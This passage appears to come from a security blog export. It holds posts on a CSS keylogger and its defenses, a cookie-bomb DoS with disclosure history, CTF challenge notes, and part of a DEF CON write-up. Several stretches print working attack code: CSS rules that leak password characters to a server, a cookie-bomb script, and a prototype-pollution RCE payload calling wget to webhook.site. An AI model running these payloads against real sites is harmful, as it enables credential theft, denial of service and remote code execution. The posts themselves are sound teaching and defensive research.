CTF with the justCatTheFish team, and if there are only one or two teams that solve some frontend Web questions, there is a high probability that justCatTheFish is one of them. The third is strellic, also from dicegang. He has created a lot of questions and the quality is very good. The writeups are also very detailed. I learned a lot of skills and new ideas from him. He always combines old or known technique and develops a new one. Of course, there are other impressive people, but I’m too lazy to introduce them one by one XD For example, the author of the article mentioned at the beginning @arkark_, @zwad3, who created a challenge that still amazes me, frequent solver @parrot409, and @maple3142, who are all very active in CTF. SummaryAfter writing, I found that I have attempted many challenges (although I couldn’t solve many of them), and some of the challenges, although the concepts are not difficult, are quite troublesome to implement. In addition, it can be seen that many challenges require looking at the source code of the lib to solve. Personally, I like this kind of question, which gives a real-world feeling. It’s something you use every day, but you don’t know how it works behind the scenes. CTF forces you to understand it. Although it has nothing to do with the web, there were also two or three challenges related to Git this year, which required understanding how Git works to solve. I learned a lot of techniques that I had no idea about before this year. I feel that my understanding of JS and browsers has improved a bit, but I can foresee that I will still be challenged next year, and there will be more things that I don’t know. Finally, I would like to thank each challenge author. It is because of these challenge authors who share their research through challenges that others can learn these novel techniques. I personally think that it is harder to make a good challenge than to solve it. If you are solving a challenge, you know that there is an solution somewhere, and you just need to find it. To make a good challenge, you need to discover something new by yourself, which is really difficult. Once again, kudos to every challenge maker.","link":"/2022/12/26/en/ctf-2022-web-js-summary/"},{"title":"CSS keylogger: Attack and Defense","text":"IntroductionI recently came across this article on Hacker News: Show HN: A CSS Keylogger, which opened my eyes and inspired me to study it in depth and write an article to share with everyone. This article will cover the following topics: What is a keylogger The principle of CSS keylogger CSS keylogger and React Defense methods Alright, let’s get started! What is a Keylogger?A keylogger is a type of malicious program that records every keystroke you make on your computer. I remember when I was young, I wrote a super simple keylogger using VB6, which just called the system’s API and recorded the corresponding keystrokes. If this is installed on your computer, everything you type will be recorded, including your account and password. However, if I remember correctly, behavior detection by antivirus software should be able to block these, so there is no need to worry too much. What if we limit ourselves to web pages? If you want to add a keylogger to a page, you usually use JavaScript to achieve it, and the code is super simple: document.addEventListener('keydown', e => &#123; console.log(e.key) &#125;) Just detect the keydown event and capture the pressed key. However, if you have the ability to insert malicious JavaScript into the web page you want to invade, you usually don’t need to go to the trouble of recording every keystroke. You can just steal cookies, tamper with pages, redirect to phishing pages, or return account and password to your own server when submitting. Therefore, keyloggers are not so useful. So, assuming we can’t insert malicious JavaScript now and can only modify CSS, can we use pure CSS to create a keylogger? Yes, after all, CSS can do a lot of things. The Principle of Pure CSS KeyloggerYou’ll understand it by looking at the code directly (taken from: maxchehab&#x2F;CSS-Keylogging): input[type=\"password\"][value$=\"a\"] &#123; background-image: url(\"http://localhost:3000/a\"); &#125; Amazing, isn’t it? If you’re not familiar with CSS selectors, let me review them for you. The above means that if the type is password and the value ends with a, the background image will load http://localhost:3000/a. Now we can modify this CSS, add uppercase and lowercase letters, numbers, and even special characters. What will happen next? If I enter abc123, the browser will send requests to: http://localhost:3000/a http://localhost:3000/b http://localhost:3000/c http://localhost:3000/1 http://localhost:3000/2 http://localhost:3000/3 That’s it, your password is completely in the hands of the attacker. This is the principle of CSS keylogger, using CSS selectors to load different URLs, you can send each character of the password to the server. It looks scary, but don’t worry, it’s not that easy. Limitations of CSS KeyloggerOrder cannot be guaranteedAlthough you enter in order, the order cannot be guaranteed when the request arrives at the backend, so sometimes the order will be messed up. For example, abc123 becomes bca213 or something. But if we modify the CSS selector, we can solve this problem: input[value^=\"a\"] &#123; background-image: url(\"http://localhost:3000/a_\"); &#125; input[value*=\"aa\"] &#123; background-image: url(\"http://localhost:3000/aa\"); &#125; input[value*=\"ab\"] &#123; background-image: url(\"http://localhost:3000/ab\"); &#125; If the beginning is a, we send out a_, and then send out a request for every two characters of the permutation and combination of 26 letters and numbers. For example, abc123 will be: a_ ab bc c1 12 23 Even if the order is messed up, you can reassemble the letters through this relationship and still get the correct password order. Duplicate characters will not send requestsBecause the loaded URLs are the same, duplicate characters will not load images and will not send new requests. This problem is currently unsolvable as far as I know. The value does not change when typingThis is actually the biggest problem with CSS Keylogger. When you enter information in an input field, the value of the input does not change. Therefore, the solutions mentioned above do not work. You can try it yourself and see that the content of the input changes, but if you check with dev tools, you will find that the value does not change at all. There are two solutions to this problem. The first is to use Webfont: &lt;!doctype html> &lt;title>css keylogger&lt;/title> &lt;style> @font-face &#123; font-family: x; src: url(./log?a), local(Impact); unicode-range: U+61; &#125; @font-face &#123; font-family: x; src: url(./log?b), local(Impact); unicode-range: U+62; &#125; @font-face &#123; font-family: x; src: url(./log?c), local(Impact); unicode-range: U+63; &#125; @font-face &#123; font-family: x; src: url(./log?d), local(Impact); unicode-range: U+64; &#125; input &#123; font-family: x, 'Comic sans ms'; &#125; &lt;/style> &lt;input value=\"a\">type `bcd` and watch network log (Code taken from: Keylogger using webfont with single character unicode-range) If the value does not change, so what? The font will still be used! Every time you type a character, the corresponding request will be sent. However, this method has two limitations: The order cannot be guaranteed, and the problem of duplicate characters cannot be solved. It does not work if the field is &lt;input type=&#39;password&#39; /&gt;. (When researching the second limitation, I discovered an interesting thing. Since Chrome and Firefox will mark websites with type ‘password’ input but without HTTPS as insecure, someone has developed a way to use ordinary input with special fonts to bypass this detection and make the input box look like a password (but the type is not password). In this case, Webfont can be used for attack.) Now let’s look at the second solution. As mentioned earlier, the crux of this problem is that the value does not change. In other words, if the value changes when you enter input, this attack method will be very useful. Hmm… does it feel familiar? class NameForm extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;value: ''&#125;; this.handleChange = this.handleChange.bind(this); &#125; handleChange(event) &#123; this.setState(&#123;value: event.target.value&#125;); &#125; render() &#123; return ( &lt;form> &lt;label> Name: &lt;input type=\"text\" value=&#123;this.state.value&#125; onChange=&#123;this.handleChange&#125; /> &lt;/label> &lt;/form> ); &#125; &#125; (The above code is adapted from React official website) If you have used React, you should be familiar with this pattern. When you enter anything, the state is changed first, and then the value of the state is mapped to the value of the input. Therefore, whatever you enter, the value will be the same. React is a super popular front-end library. It can be imagined that a lot of websites are made with React, and as long as it is React, it can almost guarantee that the value of the input will always be synchronized (almost, but there are still a few that do not follow this rule). To summarize, as long as the value of your input corresponds to the value inside (if you use React, you will almost certainly write it this way), and there is a place for others to insert custom CSS, CSS Keylogger can be successfully implemented. Although there are some flaws (cannot detect duplicate characters), the concept is feasible, but the accuracy is not that high. React’s responseThe React community has also discussed this issue in Stop syncing value attribute for controlled inputs #11896. In fact, there have always been some bugs in synchronizing the value of the input, and even the well-known traffic analysis website Mixpanel has accidentally recorded sensitive information in the past, and the root cause is that React keeps synchronizing the value. The discussion in the issue is worth reading. It mentions something that everyone often confuses: Input attributes and properties. I found a good explanation on Stackoverflow: What is the difference between properties and attributes in HTML? Attributes are basically what you have in your HTML, while properties represent the actual value. The two may not be equal. For example: &lt;input id=\"the-input\" type=\"text\" value=\"Name:\"> If you grab the attribute of this input today, you will get Name:, but if you grab the value of the input today, you will get the value currently in the input box. So this attribute is actually the same as the defaultValue we often use, which is the default value. However, in React, it synchronizes the attribute with the value, so whatever your value is, the attribute will be the same. From the discussion, it seems that in React 17, there is a good chance that this mechanism will be removed so that these two will no longer be synchronized. Defense methodsAfter talking so much above, because React has not changed this yet, the problem still exists. And in fact, besides React, other libraries may have done similar things. I won’t mention the client-side defense methods here. Basically, it’s to install some Chrome extensions written by others, which can help you detect CSS that matches the pattern. What’s more worth mentioning here is the defense on the server-side. Currently, the most permanent solution seems to be Content-Security-Policy. In short, it is an HTTP Response header that determines which resources the browser can load, such as prohibiting inline code and only allowing resources under the same domain to be loaded. The original intention of this header is to prevent XSS and attackers from loading external malicious code (such as our CSS keylogger). If you want to know more about how to use it, you can refer to this article: Content-Security-Policy - HTTP Headers Security Issues (2) SummaryI have to say, this technique is really interesting! When I first saw it, I was amazed for a while that I could find such a pure CSS keylogger. Although it is technically feasible, there are still many difficulties in implementation, and many prerequisites must be met to do such an attack. However, it is still worth paying attention to the follow-up development. In short, this article is to introduce this thing to readers, hoping that everyone will gain something. References Keylogger using webfont with single character unicode-range #24 Stop syncing value attribute for controlled inputs #11896 maxchehab&#x2F;CSS-Keylogging Content-Security-Policy - HTTP Headers Security Issues (2) Stealing Data With CSS: Attack and Defense Bypassing Browser Security Warnings with Pseudo Password Fields CSS Keylogger (and why you shouldn’t worry about it) Mixpanel JS library has been harvesting passwords","link":"/2018/03/12/en/css-keylogger/"},{"title":"DoS Attack Using Cookie: Cookie Bomb","text":"IntroductionWhen it comes to website-related attack methods, XSS, SQL injection, or CSRF are the most commonly seen methods. However, today we will introduce another type of attack that you may have heard of but are not so familiar with: DoS, Denial-of-Service attack. When it comes to DoS, most people may think that they need to send a lot of packets to the website, and then let the website server be unable to respond or exhaust resources to achieve the goal. Or you may think of DDoS (Distributed Denial-of-Service), not a single host but a bunch of hosts sending packets to a server at the same time, and then knocking it down. DoS and DDoS actually have different layers of attacks. These layers correspond to the OSI Model that you may have learned before. For example, the attacks you remember are more like attacks on the L3 network layer and L4 transport layer. Detailed attack methods can refer to: What is a DDoS attack? and How do layer 3 DDoS attacks work? | L3 DDoS. But the attack method we want to share with you in this article is a DoS attack that exists in the L7 application layer. For example, if a website has an API that can query data, and there is a default limit of 100, but I change it to 10,000 and find that the server takes about one minute to respond to me, so I send a request every two seconds. As I send more requests, the website becomes slower and slower, and finally, it crashes and can only return a 500 Internal Server Error. This is an application layer DoS attack. Any method that prevents users from accessing the website is a DoS attack. The method we found is based on the L7 application layer, so it is an L7 DoS attack. Among the many L7 DoS attack methods, there is one that I think is particularly interesting, which is the Cookie Bomb. What is a Cookie?If you have no idea what a cookie is, you can refer to this article: Session and Cookie in Plain Language: Starting from Running a Grocery Store. Simply put, some websites may store certain data in the browser, and this data is called a cookie. When the browser sends a request to the website, it will automatically bring the previously stored cookie. One of the most common applications is advertising tracking. For example, if I visit website A, and there is a GA (Google Analytics) script in website A, GA writes a cookie with an id&#x3D;abc. When the user visits website B and website B also has GA installed, when the browser sends a request to GA, it will bring the id&#x3D;abc. The server will know “this person visited website A and website B” after receiving it. As the user visits more websites, it will be clearer about their preferences. (Note: The actual tracking may be more complicated, and there are problems with third-party cookies recently, so the implementation may be different. This is just a simple example.) When writing a cookie, there is an option for the domain that can be set. You can only write up, not down. What does that mean? For example, if you are in abc.com, you can only write cookies to abc.com. But if you are in a.b.abc.com, you can write to a.b.abc.com, b.abc.com, and even abc.com. So after writing a cookie to the root domain abc.com from the subdomain a.b.abc.com, when the browser sends a request to abc.com, it will bring the cookie you wrote. What is a Cookie Bomb?Suppose my attack target is example.com. If I can find any subdomain or page on the website that allows me to write cookies, I can freely write the cookies I want. For example, suppose there is a page https://example.com/log?uid=abc. After visiting this page, uid=abc will be written to the cookie. Then, I only need to change the URL to ?uid=xxxxxxxxxx, and I can write xxxxxxxxxx to the cookie. Let’s take another example. Suppose there is a blog website, and each user has a unique subdomain, for example, mine would be huliblog.example.com. The blog can customize its own JS, so I can use JS to write the cookie I want on huliblog.example.com for example.com. Okay, what can I do after writing any cookie? Start writing a bunch of junk cookies. For example, a1=o....*4000, just write a bunch of meaningless content in it. Here, it is important to note that a cookie can write about 4kb of data, and we need at least two cookies, which means we need to write 8kb of data to achieve the attack. After you write these cookies, when you return to the main page https://example.com, according to the characteristics of the cookie, all these junk cookies will be sent to the server together, right? The next step is the moment of witnessing a miracle. The server did not display the page you usually see, but returned an error: 431 Request Header Fields Too Large. Among the many HTTP status codes, there are two codes related to the request being too large: 413 Payload Too Large 431 Request Header Fields Too Large Suppose there is a form, and you fill in a million words and send it to the server, you may receive a 413 Payload Too Large response, just like the error message says, the payload is too large, and the server cannot handle it. The header is the same. When you have too many cookies, the Cookie in the request header will be very large, so large that the server cannot handle it, and it will return a 431 Request Header Fields Too Large (but according to actual tests, some servers may reply with different codes depending on the implementation, such as Microsoft’s 400 bad request). Therefore, as long as we can stuff the user’s cookie, we can make them see this error page and cannot access the service normally. This is a cookie bomb, a DoS attack caused by a large number of cookies. The principle behind it is that “when a browser visits a webpage, it will automatically bring the corresponding cookie together.” The term “Cookie Bomb” was first proposed by Egor Homakov on January 18, 2014, in Cookie Bomb or let’s break the Internet., but similar attack methods appeared in 2009: How to use Google Analytics to DoS a client from some website Attack ProcessAs mentioned above, suppose we now find a URL https://example.com/log?uid=abc that allows us to set any cookie. The next thing to do is: Change the URL to make the cookie very large and try to make it larger than 8kb (because it seems that more server restrictions are 8kb). Pass this URL to the attack target and try to get them to click on it. The target clicked on the URL and set a very large cookie on the browser. The target visited the website https://example.com and found that they could not see the content, only a white screen or an error message, and the attack was successful. At this time, unless the user changes the browser or the cookie expires, or they clear the cookie themselves, they will always be in this state. In summary, this attack can only attack specific users and must meet two prerequisites: Find a place where you can set any cookie. The target must click on the URL found in step one. For actual attack cases, please refer to: Overflow Trilogy #777984 Denial of Service with Cookie Bomb #57356 DOM based cookie bomb #847493 Cookie Bombing cause DOS - businesses.uber.com #105363 [livechat.shopify.com] Cookie bomb at customer chats Before continuing to talk about the attack surface, let’s first mention the defense methods. Defense MethodsThe first point is not to trust user input. For example, in the example mentioned above: https://example.com/log?uid=abc, abc should not be directly written into the cookie. Instead, a basic check, such as format or length, can be performed to avoid this type of attack. Next, when I mentioned that cookies can be set from subdomains to root domains, many people should think of one thing: “What about shared subdomains?” For example, GitHub Pages, each person’s domain is username.github.io. Can’t I use a cookie bomb to bomb all GitHub Pages? Just build a malicious HTML in my own subdomain, with JS code that sets cookies, and then send this page to anyone. After they click it, they won’t be able to access any *.github.io resources because they will all be rejected by the server. This hypothesis seems to be valid, but there is actually a premise that must be established first, which is: “Users can set cookies on *.github.io to github.io.” If this premise is not established, the cookie bomb cannot be executed. In fact, there are many requirements for “not wanting the upper-level domain to be able to set cookies” like this. For example, if a.com.tw can set cookies to .com.tw or .tw, won’t a lot of unrelated websites share cookies? This is obviously unreasonable. Or the website of the Presidential Office, https://www.president.gov.tw, should not be affected by the website of the Ministry of Finance, https://www.mof.gov.tw, so .gov.tw should also be a domain that cannot set cookies. When the browser decides whether it can set cookies for a certain domain, it refers to a list called the public suffix list. The subdomains of domains that appear on this list cannot directly set cookies for that domain. For example, the following domains are on this list: com.tw gov.tw github.io So the example mentioned earlier is not valid because when I am on userA.github.io, I cannot set github.io cookies, so the cookie bomb attack cannot be executed. Regarding the public suffix list, Heroku has a special article introducing some of its historical evolution: Cookies and the Public Suffix List. Expanding the Attack SurfaceThere are two prerequisites for the two attacks mentioned above to be successful: Find a place where any cookie can be set. The target must click on the URL found in step one. If you want to make the attack easier to succeed, you can think about these two prerequisites: Is it possible to find this place easily? Is it possible that the target will be infected without clicking on the link? First, let’s talk about the second point. If cache poisoning can be used, it can be easily achieved. Cache poisoning means finding a way to make the cache server store the corrupted cache (such as the 431 status code). This way, not only you, but all other users will get the corrupted file due to the cache, and see the same error message. In this case, the target does not need to click on anything to be infected, and the attack target expands from one person to everyone. In fact, the second point has a proprietary term: CPDoS (Cache Poisoned Denial of Service). Because it uses the relationship of the cache, it is not necessary to set cookies. Other headers can also be used, not limited to cookie bombs. For more detailed related attack methods, please refer to: https://cpdos.org/ The first point “Is it possible to find this place easily?” is what I really want to mention. Before continuing to explore this point, in fact, cookie bombs have more attack surface extensions, which can be used together with other attack methods. The relevant explanations and actual cases are highly recommended to be viewed in this video: HITCON CMT 2019 - The cookie monster in your browsers, which mentions other cookie-related features besides cookie bombs. The attack method using cookie bomb in combination with other techniques in this presentation is really impressive. Finding a place to easily set cookiesWhere can we easily set cookies to achieve a cookie bomb? There is one, as mentioned earlier, a shared subdomain like *.github.io. But aren’t these already in the public suffix list? It’s impossible to set cookies. Just find one that’s not in it! But this is actually not an easy thing to do because you will find that almost all the services you know have already been registered, such as GitHub, AmazonS3, Heroku, and Netlify, etc. But I found one that is not on the list, which is Azure CDN provided by Microsoft: azureedge.net. I don’t know why, but this domain is not part of the public suffix, so if I build a CDN myself, I can execute a cookie bomb. Actual testingThe code I used for the demo is as follows, referenced and rewritten from here: const domain = 'azureedge.net' const cookieCount = 40 const cookieLength = 3000 const expireAfterMinute = 5 setCookieBomb() function setCookie(key, value) &#123; const expires = new Date(+new Date() + expireAfterMinute * 60 * 1000); document.cookie = key + '=' + value + '; path=/; domain=' + domain + '; Secure; SameSite=None; expires=' + expires.toUTCString() &#125; function setCookieBomb() &#123; const value = 'Boring' + '_'.repeat(cookieLength) for (let i=0; i&lt;cookieCount; i++) &#123; setCookie('key' + i, value); &#125; &#125; Then upload the file to Azure and set up the CDN, and you will get a custom URL: https://hulitest2.azureedge.net/cookie.html (my azure has expired, so it should be broken now when you click on it) After clicking it, a bunch of junk cookies will be set on azureedge.net: After refreshing, you will find that the website cannot be accessed: This means that the cookie bomb was successful. So any resources placed on azureedge.net will be affected. Actually, AzureCDN has the function of custom domain, so if it is a custom domain, it will not be affected. But some websites do not use custom domains, but directly use azureedge.net as the URL. In most cases, azureedge.net is used to host some resources, such as JS and CSS or images. We can easily find a website that places resources on azureedge.net to test whether the attack is effective. At first, everything was fine, and there were no problems. But after visiting the cookie bomb URL and refreshing, the entire webpage became distorted because the cookie bomb caused those resources to fail to load: Although it is impossible to make the entire webpage unreadable, the large distortion and malfunction basically make it unusable. Even some of Microsoft’s own services will be affected by this attack because they also place resources on azureedge.net: Defense methodsThe best defense is to use a custom domain instead of the default azureedge.net, so there will be no cookie bomb problem. But aside from custom domains, azureedge.net should actually be registered in the public suffix, so users cannot set cookies on this domain. In addition to these two defense methods, there is another one you may not have thought of. When we import resources, don’t we do it like this: &lt;script src=&quot;htps://test.azureedge.net/bundle.js&quot;&gt;&lt;/script&gt;. Just add an attribute crossorigin, like this: &lt;script src=&quot;htps://test.azureedge.net/bundle.js&quot; crossorigin&gt;&lt;/script&gt;, and you can avoid the cookie bomb attack. This is because the original method will bring cookies when sending requests, but if you add crossorigin and use cross-origin to get it, cookies will not be brought by default, so there will be no header too large situation. Just remember to adjust it on the CDN side as well, and make sure the server has added the Access-Control-Allow-Origin header to allow cross-origin resource requests. I used to be confused about when to add crossorigin, but now I know one of the situations. If you don’t want to bring cookies together, you can add crossorigin. Another exampleTumblr, which was once popular in a specific field but turned to Automattic after being acquired, has a special feature that allows you to customize CSS and JavaScript on your personal page, and the domain of this personal page will be userA.tumblr.com, and tumblr.com is not registered on the public suffix, so it will also be affected by cookie bomb. Visit this URL: https://aszx87410.tumblr.com/ and then refresh or go to the Tumblr homepage, you will find that it cannot be accessed (the JS that writes cookies is not written well, it only works on Chrome, not Firefox): Follow-up ReportOn June 16, 2021, I reported the cookie bomb issue on Tumblr on HackerOne, and received a reply the next day. The other party replied: this behavior does not pose a concrete and exploitable risk to the platform in and on itself, as this can be fixed by clearing the cache, and is more of a nuisance than a security vulnerability For some companies, if only a cookie bomb is caused, the harm is too small, and the first victim must click on that URL, and the second only needs to clear the cookie to be okay, so it is not recognized as a security vulnerability. Microsoft reported it through MSRC on June 10, 2021. About two weeks later, on June 22, they received a reply, saying that the relevant team had been notified for processing, but this issue did not meet the standard for security updates, and there would be no notification after it was fixed. Later, I wrote to ask if this issue could be used as an example in the blog. I received a reply on June 30 saying OK. ConclusionMost of the vulnerabilities I used to pay attention to were like SQL Injection or XSS, which could steal user data. But recently, I suddenly discovered that there are many interesting DoS vulnerabilities, especially application-layer DoS, such as the cookie bomb mentioned in this article, or ReDoS achieved using RegExp, and GraphQL DoS, etc. Although the impact of a simple cookie bomb is very limited if it is not combined with other attack methods, and it is okay as long as the cookie is cleared, I still think it is a pretty interesting attack, because I was originally interested in things related to cookies (maybe because I was harmed before). But in fact, in addition to feeling that the cookie bomb is very interesting after researching it, there is also something that has benefited me a lot and broadened my horizons, which is the use of cookie bombs combined with other attack methods mentioned in the HITCON CMT 2019 - The cookie monster in your browsers video posted earlier. In the field of information security, how to combine different, seemingly small problems into big problems has always been an art. Only a cookie bomb may not be able to do much, but combined with other things, it may create a serious vulnerability. Currently, I am not proficient in this area, but I believe that one day I can do it. In short, this article is just to briefly introduce the cause and repair method of the cookie bomb to everyone. If your service provides subdomains to users, remember to evaluate whether you need to register on the public suffix list to avoid subdomains writing cookies to the root domain, thereby affecting all subdomains.","link":"/2021/07/10/en/cookie-bomb/"},{"title":"Notes on Several CTF Challenges Related to Web and JS","text":"Recently, there were several CTF challenges that were quite good, such as SECCON and HITCON, but unfortunately, I was traveling abroad at that time and was too lazy to write complete writeups after returning. Originally, I was even too lazy to take notes, but once time passed, it became difficult to find related information, so I decided to write a brief summary. In addition, I will also briefly mention several challenges that I think I should have taken notes on before, but for some reason, I did not. Keywords: Node.js prototype pollution gadget to RCE (Balsn CTF 2022 - 2linenodejs) Obtaining the original value of a JS proxy (corCTF 2022 - sbxcalc) Cache of browser back behavior (SECCON CTF 2022 - spanote) Using SVG to create synchronous XSS (HITCON CTF 2022) Reading data from shadow DOM (HITCON CTF 2022) Balsn CTF 2022 - 2linenodejsThe code is very simple: #!/usr/local/bin/node process.stdin.setEncoding('utf-8'); process.stdin.on('readable', () => &#123; try&#123; console.log('HTTP/1.1 200 OK\\nContent-Type: text/html\\nConnection: Close\\n'); const json = process.stdin.read().match(/\\?(.*?)\\ /)?.[1], obj = JSON.parse(json); console.log(`JSON: $&#123;json&#125;, Object:`, require('./index')(obj, &#123;&#125;)); &#125;catch (e) &#123; require('./usage') &#125;finally&#123; process.exit(); &#125; &#125;); // index module.exports=(O,o) => ( Object.entries(O).forEach( ([K,V])=>Object.entries(V).forEach( ([k,v])=>(o[K]=o[K]||&#123;&#125;,o[K][k]=v) ) ), o ); There is an obvious prototype pollution vulnerability, so the challenge is about how to achieve RCE after having prototype pollution in node.js. Another key point is the require(&#39;./usage&#39;) inside the catch. The last key point is this paper: Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js, which mentions many cases of RCE from prototype pollution and provides gadgets or some hints. However, one of the vulnerabilities in the paper has been fixed in the version used in this challenge: https://github.com/nodejs/node/blob/v18.8.0/lib/internal/modules/cjs/loader.js#L484 const &#123; 1: name, 2: expansion = '' &#125; = RegExpPrototypeExec(EXPORTS_PATTERN, request) || kEmptyObject; kEmptyObject is ObjectFreeze(ObjectCreate(null)), so it cannot be polluted. But anyway, if you continue to look for it in the file, you will find that the trySelf function has the same problem here: https://github.com/nodejs/node/blob/c200106305f4367ba9ad8987af5139979c6cc40c/lib/internal/modules/cjs/loader.js#L454 const &#123; data: pkg, path: pkgPath &#125; = readPackageScope(parentPath) || &#123;&#125;; The default value here also uses &#123;&#125;, so it can be interfered with through prototype pollution. The following code will load ./pwn.js instead of ./usage.js: Object.prototype[\"data\"] = &#123; exports: &#123; \".\": \"./pwn.js\" &#125;, name: './usage.js' &#125; Object.prototype[\"path\"] = './' require('./usage.js') Therefore, through prototype pollution, any file can be required. The next task is to find a built-in file with a usable payload. My teammate found /opt/yarn-v1.22.19/preinstall.js, and the final payload looks like this: Object.prototype[\"data\"] = &#123; exports: &#123; \".\": \"./preinstall.js\" &#125;, name: './usage' &#125; Object.prototype[\"path\"] = '/opt/yarn-v1.22.19' Object.prototype.shell = \"node\" Object.prototype[\"npm_config_global\"] = 1 Object.prototype.env = &#123; \"NODE_DEBUG\": \"console.log(require('child_process').execSync('wget$&#123;IFS&#125;https://webhook.site/a0beafdc-df63-4804-85a8-7945ad473bf5?q=2').toString());process.exit()//\", \"NODE_OPTIONS\": \"--require=/proc/self/environ\" &#125; require('./usage.js') Writeups by others: https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs Node.js require() RCE复现 corCTF 2022 - sbxcalcThe core part of this challenge can be seen as follows: var p = new Proxy(&#123;flag: window.flag || 'flag'&#125;, &#123; get: () => 'nope' &#125;) How can you get the flag blocked by the proxy? The answer is Object.getOwnPropertyDescriptor. Object.getOwnPropertyDescriptor(p, &#39;flag&#39;) can be used to obtain the original value instead of the value processed by the proxy. Author’s writeup: https://brycec.me/posts/corctf_2022_challenges#sbxcalc SECCON CTF 2022 Quals - spanoteThere is a cache in Chrome called back&#x2F;forward cache, abbreviated as bfcache, which I heard for the first time: https://web.dev/i18n/en/bfcache/ The second disk cache should be more familiar to everyone, and fetched resources will be stored in it. Using this bfcache, interesting behaviors can be achieved. Now there is an API like this: fastify.get(\"/api/notes/:noteId\", async (request, reply) => &#123; const user = new User(request.session.userId); if (request.headers[\"x-token\"] !== hash(user.id)) &#123; throw new Error(\"Invalid token\"); &#125; const noteId = validate(request.params.noteId); return user.sendNote(reply, noteId); &#125;); Although it is a GET, it will check the custom header, so it cannot be accessed directly by the browser. But with the cache behavior just mentioned, you can: Open /api/notes/id in the browser and an error message will appear. Go to the homepage with the same tab. At this time, the homepage will use fetch with custom header to fetch /api/notes/id, and the browser will store the result in the disk cache. Go back one page, and the screen will display the result of the disk cache. You can use the browser to directly browse the cached response and bypass the restriction of the custom header. For a more detailed writeup of the entire question, please see here: https://blog.arkark.dev/2022/11/18/seccon-en/#web-spanote HITCON CTF 2022First, let’s post the writeups for maple and splitline: https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202022 https://blog.splitline.tw/hitcon-ctf-2022/ This time I only looked at Self Destruct Message, and briefly talked about several points. The first is when executing element.innerHTML = str, usually anything in HTML will be executed asynchronously, for example: element.innerHTML = '&lt;img src=x onerror=console.log(1)>' console.log(2) It is definitely logging 2 first and then 1. But if you write it like this: const div = document.createElement('div') div.innerHTML = '&lt;svg>&lt;svg onload=console.log(1)>' console.log(2) It will magically become 1 in front, and this div will even work without being placed in the DOM. The relevant discussion can be seen in this thread: https://twitter.com/terjanq/status/1421093136022048775 Next is to use the error stack to find the original location and get the flag id: window.addEventListener('unhandledrejection', e => &#123; console.log(e.reason.stack.match(/\\/message\\/(\\w+)/)[1]); &#125;); And this question also has other solutions. Although the element is placed in the shadow DOM, the flag can be stolen through some xsleak. The more complete research is here: The Closed Shadow DOM Similar questions have appeared in DiceCTF 2022, and I have written a post about my experience, but I didn’t start tagging keywords at that time: https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/","link":"/2022/12/08/en/ctf-js-notes/"},{"title":"DEF CON CTF 2022 Qualifier Notes","text":"This year’s DEF CON CTF qualifier is similar to last year’s, with mostly binary-related problems, and this year requires a lot of reverse knowledge. As someone who basically doesn’t know how to reverse, I can only sit on the sidelines and cheer on my teammates. However, the only web problem this year (called Discoteq) was quite interesting. The difficulty was not high, but it tested debugging skills, observation skills, and the ability to quickly learn something new. I think it tested basic skills rather than knowledge of a particular language or framework, which was great. Since this was the only problem that was easy to solve this year, I decided to write about it in a different way. I will write about my thought process for solving the problem based on the timeline. The time stamp indicates how long it took from the release of the problem. 17:40 Problem released17:44(4m) Start reading the problemI started to observe the Discoteq website, which is basically a chat website where you can register and log in to send messages. The communication between receiving and sending messages is done through websockets. In addition to regular text messages, you can also initiate a vote. Then, I familiarized myself with what the website was doing. After realizing that there weren’t too many features, I started looking at the source code. Although the source code was not provided for this problem, since it was a frontend, I used devtools to look at it and found that it was not too obfuscated or encrypted, so it was quite readable. 17:54(14m) Initial thoughtsAt this point, I found an API endpoint called POST /api/flag in the source code using /api and /flag as keywords. If you are an admin, you can use this API to get the flag. From the screenshot below, you can also see that there is an AdminPage in the program: There is also an admin bot for this problem that will read your messages, so I guessed that this problem might be about XSS &#x3D;&gt; getting the admin token (stored in localStorage) &#x3D;&gt; calling the API to get the flag. However, I didn’t know how to actually do it, so I continued to look at the code. 18:09(29m) Found vulnerability and guessed complete attack chainAfter playing for a while, I noticed a vulnerability. When you send a message, the JSON looks like this: &#123; \"type\": \"widget\", \"widget\": \"/widget/chatmessage\", \"author\": &#123; \"user\": \"ewfwefoenfof32of&lt;h1 a=\\\">test&lt;/h1#ab525155\", \"platform\": \"web\" &#125;, \"recipients\": [ \"qdqwd\", \"admin#13371337\" ], \"data\": &#123; \"message\": \"hello\" &#125; &#125; After sending the message, the browser sends a request to https://example.com/widget/chatmessage to get data, and the response is as follows: Text version: þRFW\u0003\u0002\u0004core\u0007widgets\u0002\u0004core\bmaterial\u0001\u0005local\u0001\u0004root\u0001\u0006loaded Container\u0001\u0005child \u0006Column\u0001\bchildren\u0005\u0003 \u0003Row\u0001\bchildren\u0005\u0002 \u0004Text\u0001\u0004text\u0004\u0005From \u0004Text\u0002\u0004text \u0002\u0004\u0006author\u0004\u0004user\u0005style\u0007\u0001\u0005color\u0002Êÿ \u0007Padding\u0002\u0007padding\u0005\u0004\u0003\u0003\u0014@\u0003\u0003\u0005child \u0004Text\u0001\u0004text \u0002\u0004\u0004data\u0004\u0005title\u000f \u0001\u0004\u0006loaded\u0002\u0001 \u0006Column\u0001\bchildren\u0005\u0002\b \u0001\u0004poll_options \u0003Row\u0001\bchildren\u0005\u0002 \u0007Padding\u0002\u0005child \u000eElevatedButton\u0002\u0005child \u0004Text\u0001\u0004text\u0001\u0004\u0004text onPressed\u000e\bapi_post\u0002\u0004path \u0002\u0004\u0004data\u0004\u0007apiVote\u0004body\u0007\u0001 selection\u0001\u0004\u0004text\u0007padding\u0005\u0004\u0003\u0003\u0014@\u0003$@\u0003 \u0004Text\u0001\u0004text\u0001\u0004\u0005count TextButton\u0002\u0005child \u0004Text\u0002\u0004text\u0004\u0007Refresh\u0005style\u0007\u0001\u0005color\u0002ÿÿ onPressed\u0011\u0001\u0004\u0006loaded\u0010 ApiMapper\u0004\u0003url \u0002\u0004\u0004data\u0004\u0006apiGet\u0007jsonKey\u0004\u0007options\u0007dataKey\u0004poll_options\bonLoaded\u0011\u0001\u0004\u0006loaded\u0001 It looks like something that has been serialized, and if I change the content of the widget to .huli.tw/test, the browser will fetch something from https://example.com.huli.tw/test. Therefore, I can manipulate where JS goes to get this serialized thing using .huli.tw or @huli.tw. Therefore, I guessed that this problem is: Find out how to generate this widget Use the widget to XSS (e.g. add &lt;script&gt; or other XSS payloads) 